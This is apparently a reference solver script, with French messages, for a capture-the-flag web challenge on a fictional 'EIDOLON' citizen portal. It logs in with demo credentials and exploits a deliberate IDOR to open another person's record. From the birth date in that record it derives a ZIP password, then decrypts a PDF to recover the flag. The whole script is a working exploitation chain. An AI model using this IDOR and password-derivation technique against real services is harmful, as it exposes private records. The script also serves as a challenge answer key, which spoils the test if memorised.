#!/usr/bin/env python3
"""GHOST RECORD — reference solver for the EIDOLON portal challenge.

This script reproduces the *intended* resolution path of a real player,
attacking only the CTF instance whose URL is supplied on the command line.
It never reads the Flask source, ``challenge.yml``, the container filesystem
or the SQLite/data layer, and it does not embed the flag.

Intended path reproduced here:

1. Decode the MIRA-07 badge QR locally -> ``eidolon://identity/<record_id>``.
2. Authenticate on EIDOLON with the demo citizen credentials.
3. Use the intentional IDOR to open MIRA-07's citizen record.
4. Read the holder's birth date from that record page.
5. Derive the EIDOLON Legacy archive password (``AAAAMMJJ``).
6. Download the protected ZIP, open it, read the PDF and extract the flag.

The flag is printed only once it has actually been recovered from the PDF.
Exit code 0 means success; any other code means a step failed.
"""

from __future__ import annotations

import argparse
import io
import re
import subprocess
import sys
from datetime import datetime
from pathlib import Path

import requests

# ``eidolon://identity/<id>`` — the badge encodes a record reference, not a URL.
QR_REFERENCE = re.compile(r"eidolon://identity/(\d+)")
# Birth date rendered on the record page as dd/mm/YYYY (see record.html).
BIRTH_DATE = re.compile(r'id="birth-date">\s*([0-3]\d/[01]\d/\d{4})\s*<')
# Flask injects the CSRF token as a hidden field in every form.
CSRF_FIELD = re.compile(r'name="csrf_token"\s+value="([^"]+)"')
FLAG_RE = re.compile(r"FPS\{[A-Za-z0-9_]{1,48}\}")

# Default badge shipped with the challenge; overridable with --badge.
DEFAULT_BADGE = Path(__file__).resolve().parents[1] / "defi/files/mira-07-badge.png"


class SolveError(RuntimeError):
    """Any recoverable failure in the resolution path, with a clear message."""


# --------------------------------------------------------------------------- #
# Step 1 — decode the badge QR code locally (offline, no external service).
# --------------------------------------------------------------------------- #
def decode_badge(badge_path: Path) -> int:
    """Return the record id encoded in the badge QR code.

    Tries OpenCV then pyzbar. Both are optional: if neither is installed the
    caller can bypass this step with --record-id.
    """
    if not badge_path.is_file():
        raise SolveError(f"Badge introuvable : {badge_path}")

    payload = _decode_with_opencv(badge_path) or _decode_with_pyzbar(badge_path)
    if payload is None:
        raise SolveError(
            "Aucun lecteur de QR local disponible (installez opencv-python-headless "
            "ou pyzbar, ou utilisez zbarimg), ou fournissez la valeur décodée via "
            "--record-id / --qr."
        )
    return parse_reference(payload)


def _decode_with_opencv(badge_path: Path) -> str | None:
    try:
        import cv2  # type: ignore
    except ImportError:
        return None
    image = cv2.imread(str(badge_path))
    if image is None:
        return None
    payload, _, _ = cv2.QRCodeDetector().detectAndDecode(image)
    return payload or None


def _decode_with_pyzbar(badge_path: Path) -> str | None:
    try:
        from PIL import Image  # type: ignore
        from pyzbar.pyzbar import decode  # type: ignore
    except ImportError:
        return None
    results = decode(Image.open(badge_path))
    if not results:
        return None
    return results[0].data.decode("utf-8", "replace")


def parse_reference(payload: str) -> int:
    """Extract the record id from an ``eidolon://identity/<id>`` reference."""
    match = QR_REFERENCE.search(payload)
    if not match:
        raise SolveError(f"Référence EIDOLON inattendue : {payload!r}")
    return int(match.group(1))


# --------------------------------------------------------------------------- #
# HTTP helpers.
# --------------------------------------------------------------------------- #
def extract_csrf(html: str) -> str:
    match = CSRF_FIELD.search(html)
    if not match:
        raise SolveError("Jeton CSRF absent de la page (portail inattendu ?).")
    return match.group(1)


def login(session: requests.Session, base: str, user: str, password: str, timeout: float) -> None:
    """Authenticate on EIDOLON; raise on network error or invalid credentials."""
    try:
        page = session.get(f"{base}/login", timeout=timeout)
        page.raise_for_status()
        token = extract_csrf(page.text)
        response = session.post(
            f"{base}/login",
            data={"csrf_token": token, "username": user, "password": password},
            timeout=timeout,
            allow_redirects=False,
        )
    except requests.RequestException as exc:
        raise SolveError(f"Portail injoignable : {exc}") from exc

    # A successful login replies 303 -> /dashboard; bad creds re-render with 401.
    if response.status_code != 303 or "/dashboard" not in response.headers.get("Location", ""):
        raise SolveError(
            f"Authentification refusée (HTTP {response.status_code}). "
            "Vérifiez --username / --password."
        )


def fetch_record(session: requests.Session, base: str, record_id: int, timeout: float) -> str:
    """Open a citizen record. Reaching a foreign record is the intentional IDOR."""
    try:
        response = session.get(f"{base}/records/{record_id}", timeout=timeout)
    except requests.RequestException as exc:
        raise SolveError(f"Erreur réseau sur le dossier {record_id} : {exc}") from exc
    if response.status_code != 200:
        raise SolveError(f"Dossier {record_id} inaccessible (HTTP {response.status_code}).")
    return response.text


def derive_password(record_html: str) -> str:
    """EIDOLON Legacy rule: password = holder birth date as AAAAMMJJ."""
    match = BIRTH_DATE.search(record_html)
    if not match:
        raise SolveError("Date de naissance absente du dossier (règle Legacy inapplicable).")
    birth = datetime.strptime(match.group(1), "%d/%m/%Y")
    return birth.strftime("%Y%m%d")


def download_archive(session: requests.Session, base: str, record_id: int, timeout: float) -> bytes:
    try:
        response = session.get(f"{base}/records/{record_id}/export", timeout=timeout)
    except requests.RequestException as exc:
        raise SolveError(f"Erreur réseau lors de l'export : {exc}") from exc
    if response.status_code != 200:
        raise SolveError(f"Export indisponible (HTTP {response.status_code}).")
    if "zip" not in response.headers.get("Content-Type", ""):
        raise SolveError("La réponse d'export n'est pas une archive ZIP.")
    return response.content


# --------------------------------------------------------------------------- #
# Step 6 — open the AES ZIP and read the flag from the PDF.
# --------------------------------------------------------------------------- #
def extract_pdf(archive: bytes, password: str) -> bytes:
    """Decrypt the WinZip-AES archive and return the PDF bytes."""
    try:
        import pyzipper
    except ImportError as exc:
        raise SolveError(
            "pyzipper requis pour ouvrir le ZIP AES (pip install pyzipper)."
        ) from exc
    try:
        with pyzipper.AESZipFile(io.BytesIO(archive)) as zf:
            names = zf.namelist()
            if not names:
                raise SolveError("Archive ZIP vide.")
            zf.setpassword(password.encode("ascii"))
            return zf.read(names[0])
    except (RuntimeError, pyzipper.BadZipFile) as exc:
        # Wrong password surfaces here as a decryption/CRC failure.
        raise SolveError(f"Déverrouillage du ZIP échoué (mot de passe {password}) : {exc}") from exc


def flag_from_pdf(pdf_bytes: bytes) -> str:
    """Extract the flag from the PDF text (pypdf, with a pdftotext fallback)."""
    text = _pdf_text_pypdf(pdf_bytes)
    if text is None:
        text = _pdf_text_pdftotext(pdf_bytes)
    if text is None:
        raise SolveError(
            "Impossible d'extraire le texte du PDF (installez pypdf ou poppler-utils)."
        )
    match = FLAG_RE.search(text)
    if not match:
        raise SolveError("Flag absent du PDF extrait.")
    return match.group(0)


def _pdf_text_pypdf(pdf_bytes: bytes) -> str | None:
    try:
        from pypdf import PdfReader  # type: ignore
    except ImportError:
        return None
    reader = PdfReader(io.BytesIO(pdf_bytes))
    return "".join(page.extract_text() or "" for page in reader.pages)


def _pdf_text_pdftotext(pdf_bytes: bytes) -> str | None:
    try:
        proc = subprocess.run(
            ["pdftotext", "-", "-"],
            input=pdf_bytes,
            capture_output=True,
            timeout=15,
            check=True,
        )
    except (FileNotFoundError, subprocess.SubprocessError):
        return None
    return proc.stdout.decode("utf-8", "replace")


# --------------------------------------------------------------------------- #
# Orchestration.
# --------------------------------------------------------------------------- #
def solve(args: argparse.Namespace) -> str:
    base = args.url.rstrip("/")

    if args.record_id is not None:
        record_id = args.record_id
    elif args.qr is not None:
        record_id = parse_reference(args.qr)
    else:
        record_id = decode_badge(Path(args.badge))
    print(f"[*] Référence MIRA-07 décodée : dossier {record_id}")

    session = requests.Session()
    session.headers["User-Agent"] = "ghost-record-solver/1.0"

    login(session, base, args.username, args.password, args.timeout)
    print(f"[*] Authentifié comme {args.username}")

    record_html = fetch_record(session, base, record_id, args.timeout)
    print(f"[*] Dossier {record_id} ouvert via l'IDOR")

    password = derive_password(record_html)
    print(f"[*] Mot de passe Legacy dérivé (AAAAMMJJ) : {password}")

    archive = download_archive(session, base, record_id, args.timeout)
    print(f"[*] Archive téléchargée ({len(archive)} octets)")

    pdf_bytes = extract_pdf(archive, password)
    print(f"[*] PDF déchiffré ({len(pdf_bytes)} octets)")

    return flag_from_pdf(pdf_bytes)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(
        "--url",
        default="http://127.0.0.1:8080",
        help="URL de base de l'instance CTF (défaut : http://127.0.0.1:8080).",
    )
    parser.add_argument(
        "--username", default="runner.1042", help="Identifiant citoyen de démonstration."
    )
    parser.add_argument(
        "--password", default="vanta-guest-2147", help="Mot de passe de démonstration."
    )
    parser.add_argument(
        "--badge", default=str(DEFAULT_BADGE), help="Chemin du badge PNG à décoder localement."
    )
    parser.add_argument("--qr", help="Valeur QR déjà décodée (ex. eidolon://identity/1057).")
    parser.add_argument("--record-id", type=int, help="Référence de dossier fournie manuellement.")
    parser.add_argument(
        "--timeout", type=float, default=10.0, help="Délai réseau par requête (secondes)."
    )
    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    try:
        flag = solve(args)
    except SolveError as exc:
        print(f"[-] Échec : {exc}", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        print("[-] Interrompu.", file=sys.stderr)
        return 130
    print(f"[+] FLAG : {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
